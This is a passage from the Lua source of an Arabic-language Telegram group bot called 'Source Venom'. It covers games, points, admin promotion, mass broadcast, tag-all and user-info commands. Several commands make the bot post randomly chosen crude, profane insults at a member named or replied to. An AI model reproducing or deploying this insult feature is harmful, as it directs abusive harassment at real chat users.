دائما🕯؟'
}  
Dev_Abs(msg.chat_id_, msg.id_, 1, ''..VenomTEAM[math.random(#VenomTEAM)]..'' , 1, 'md')  
return false
end
end
--     Source Venom     --
if text and (text == 'الالعاب' or text == 'العاب' or text == 'اللعبه') and SourceCh(msg) then
if not DevAbs:get(Venom..'Abs:Lock:Games'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1,[[
𖠧︙قائمة العاب المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙لعبة التخمين ↫ خمن
𖠧︙لعبة الامثله ↫ امثله
𖠧︙لعبة العكس ↫ العكس
𖠧︙لعبة الاسئله ↫ اسئله
𖠧︙لعبة الروليت ↫ روليت
𖠧︙لعبة الحزوره ↫ حزوره
𖠧︙لعبة الترتيب ↫ ترتيب
𖠧︙لعبة المعاني ↫ معاني
𖠧︙لعبة التويت ↫ كت تويت
𖠧︙لعبة المختلف ↫ المختلف
𖠧︙لعبة السمايلات ↫ سمايلات
𖠧︙لعبة المحيبس ↫ المحيبس
𖠧︙لعبة الرياضيات ↫ رياضيات
𖠧︙لعبة الانكليزيه ↫ انكليزيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙نقاطي • بيع نقاطي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]], 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
--     Source Venom     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙لم تربح اي نقطه\n𖠧︙ارسل ↫ الالعاب للعب', 1, 'md')
else
DevAbs0 = (DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevAbs:incrby(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevAbs0)
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙تم بيع '..(DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n𖠧︙كل نقطه تساوي 50 رساله', 'md')
DevAbs:del(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source Venom     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,abbas) 
local num = 0
local admins = abbas.members_  
for i=0 , #admins do   
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevAbs:sadd(Venom..'Abs:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevAbs:sadd(Venom..'Abs:AbsConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لا يوجد ادمنيه ليتم رفعهم\n𖠧︙تم رفع مالك المجموعه", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم رفع '..num..' من الادمنيه \n𖠧︙تم رفع مالك المجموعه', 1, 'md')
end
end,nil) 
end
--     Source Venom     --
if text == 'غادر' and SudoBot(msg) then
if DevAbs:get(Venom.."Abs:Left:Bot"..Venom) and not SecondSudo(msg) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "𖠧︙المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم مغادرة المجموعه \n𖠧︙تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, Venom)
DevAbs:srem(Venom.."Abs:Groups",msg.chat_id_)
end
--     Source Venom     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
--     Source Venom     --
if text == "معلوماتي" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAbs:get(Venom..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAbs:get(Venom..'Abs:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n𖠧︙معرفك ↫ ❨ ['..username..'] ❩\n𖠧︙ايديك ↫ ❨ `'..result.id_..'` ❩\n𖠧︙نقاطك ↫ ❨ '..user_nkt..' ❩\n𖠧︙رسائلك ↫ ❨ '..user_msgs..' ❩\n𖠧︙جهاتك ↫ ❨ '..cont..' ❩\n𖠧︙تفاعلك ↫ '..formsgs(msguser)..'\n𖠧︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     Source Venom     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:setex(Venom..'DevAbs4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '𖠧︙ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" then  
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
if DevAbs:get(Venom..'Abs:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbs:get(Venom.."Abs:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_,"𖠧︙الاشتراك الاجباري مفعل \n𖠧︙على القناة ↫ [@"..GetInfo.result.username.."]")
else
DevAbs:setex(Venom..'DevAbs4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"𖠧︙لاتوجد قناة لتفعيل الاشتراك\n𖠧︙ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" then  
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del(Venom..'Abs:ChId')
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الاشتراك الاجباري'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del(Venom..'Abs:ChId')
Dev_Abs(msg.chat_id_, msg.id_, 1,"𖠧︙تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if DevAbs:get(Venom..'Abs:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbs:get(Venom.."Abs:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_, "𖠧︙قناة الاشتراك ↫ [@"..GetInfo.result.username.."]")
else
send(msg.chat_id_, msg.id_, "𖠧︙لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
--     Source Venom     --
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function VenomTEAM(extra,result,success)
if DevAbs:get(Venom.."Abs:Send:Bot"..Venom) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"𖠧︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevAbs:smembers(Venom.."Abs:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevAbs:smembers(Venom.."Abs:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم اذاعة رسالتك بالتوجيه \n𖠧︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n𖠧︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),VenomTEAM)
end
end
--     Source Venom     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevAbs:set(Venom..'Abs:viewget'..msg.sender_user_id_,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
--     Source Venom     --
if text == "السورس" or text == "سورس" then 
local text =  [[
Welcome To Source
𖠧︙Venom TEAM
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)

𖠧︙[Exp Source](https://t.me/venomfile)

𖠧︙[Developer](https://t.me/wKwvv)
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Tws Venom](https://t.me/wkwvbot)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source Venom     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevAbs:get(Venom.."Abs:Kick:Me"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAbs:set(Venom..'yes'..msg.sender_user_id_, 'delyes')
DevAbs:set(Venom..'no'..msg.sender_user_id_, 'delno')
local Text = '𖠧︙هل انت متأكد من المغادره'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Venom     --
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAbs:set(Venom.."Abs:Kick:Me"..msg.chat_id_, true)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevAbs:del(Venom.."Abs:Kick:Me"..msg.chat_id_)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source Venom     --
if text == "نزلني" and ChCheck(msg) then
if DevAbs:get(Venom.."Abs:Del:Me"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevAbs:set(Venom..'yesdel'..msg.sender_user_id_, 'delyes')
DevAbs:set(Venom..'nodel'..msg.sender_user_id_, 'delno')
local Text = '𖠧︙هل انت متأكد من تنزيلك'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Venom     --
if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAbs:set(Venom.."Abs:Del:Me"..msg.chat_id_, true)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevAbs:del(Venom.."Abs:Del:Me"..msg.chat_id_)
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source Venom     --
if text and (text == 'تفعيل التاك' or text == 'تفعيل التاك للكل' or text == 'تفعيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل امر تاك للكل'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:TagAll'..msg.chat_id_)
end
if text and (text == 'تعطيل التاك' or text == 'تعطيل التاك للكل' or text == 'تعطيل تاك للكل') and Admin(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل امر تاك للكل'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevAbs:get(Venom..'Abs:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "𖠧︙وينكم يالربع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAbs:get(Venom..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevAbs:get(Venom..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     Source Venom     --
if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
if not DevAbs:get(Venom..'Abs:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "𖠧︙"..txt[2].." \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevAbs:get(Venom..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevAbs:get(Venom..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
end
--     Source Venom     --
if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevAbs:get(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (DevAbs:get(Venom..'Abs:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevAbs:get(Venom..'Abs:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevAbs:get(Venom..'Abs:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n𖠧︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n𖠧︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n𖠧︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
end
--     Source Venom     --
if text == "معرفي" and ChCheck(msg) then
function get_username(extra,result,success)
text = '𖠧︙معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "اسمي" and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '𖠧︙اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source Venom     --
if text == "اهمس" or text == "همسه" or text == "اريد بوت الهمسه" or text == "دزلي بوت الهمسه" or  text == "دزولي بوت الهمسه" then  Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙@HMSEBOT', 1, 'md') end
if text == "رابط حذف" or text == "رابط الحذف" or text == "اريد رابط الحذف" or  text == "شمرلي رابط الحذف" or text == "اريد رابط حذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'𖠧︙اضغط للحصول على الرابط',nil,inline) return false end
if text == "بوت الحذف" or text == "اريد بوت الحذف" or text == "اريد بوت حذف" or text == "بوت حذف" or text == "بوت حذف حسابات" or text == "راح احذف" then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'𖠧︙اضغط للحصول على البوت',nil,inline) return false end
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevAbs:get(Venom..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevAbs:get(Venom..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text == "ايديي" and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
if text == "رتبتي" and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ايدي المجموعه" and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevAbs:del(Venom..'Abs:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevAbs:del(Venom..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source Venom     --
if text == "المطور" then 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbs:get(Venom.."Abs:ChId"))
local GetInfo = JSON.decode(Check)
local DevCh1 = GetInfo.result.username
local DevText = DevAbs:get(Venom.."DevText")
if DevAbs:get(Venom.."Abs:ChId") then DevCh = '\n𖠧︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
if DevText then
Dev_Abs(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*Dev User* ↬ ['..DevUser..']\n𖠧︙*Dev Id* ↬ '..DevId..DevCh, 1, "md")
end
end,nil)
end 
--     Source Venom     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') then 
if not DevAbs:get(Venom..'Abs:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function VenomTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(218385683) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevAbs:sismember(Venom.."Abs:AbsConstructor:"..msg.chat_id_,result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local VenomTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md') 
local VenomTEAM = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..VenomTEAM[math.random(#VenomTEAM)], 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,VenomTEAM)
end
end
--     Source Venom     --
if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
if not DevAbs:get(Venom..'Abs:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Venom) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(218385683) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevAbs:sismember(Venom.."Abs:AbsConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local VenomTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md') 
local VenomTEAM = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..VenomTEAM[math.random(#VenomTEAM)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
if not DevAbs:get(Venom..'Abs:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Venom) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local VenomTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md') 
local VenomTEAM = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..VenomTEAM[math.random(#VenomTEAM)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
if not DevAbs:get(Venom..'Abs:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Venom) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local VenomTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md') 
local VenomTEAM = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..VenomTEAM[math.random(#VenomTEAM)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     Source Venom     --
